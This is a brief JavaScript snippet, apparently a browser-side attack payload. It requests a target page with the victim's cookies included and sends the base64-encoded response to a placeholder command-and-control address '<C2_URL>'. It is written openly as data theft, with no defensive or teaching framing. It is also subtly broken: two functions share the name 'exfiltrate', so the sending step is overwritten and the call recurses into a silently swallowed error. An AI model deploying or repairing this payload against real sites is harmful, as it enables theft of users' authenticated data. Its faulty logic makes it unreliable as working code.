function to_base64(str) {
  const utf8_bytes = new TextEncoder().encode(str)
  const bin_str = String.fromCharCode(...utf8_bytes);
  return btoa(bin_str)
}

async function exfiltrate(data) {
  await fetch('http://<C2_URL>?data=' + to_base64(data));
}

async function exfiltrate(target_url) {
  try {
    const response = await fetch(target_url, {credentials: "include"});
    const data = await response.text();
    
    await exfiltrate(`[${target_url}] => [${data}]\n`);
  } catch {
    // do nothing
  }
}

exfiltrate('http://<target-url>');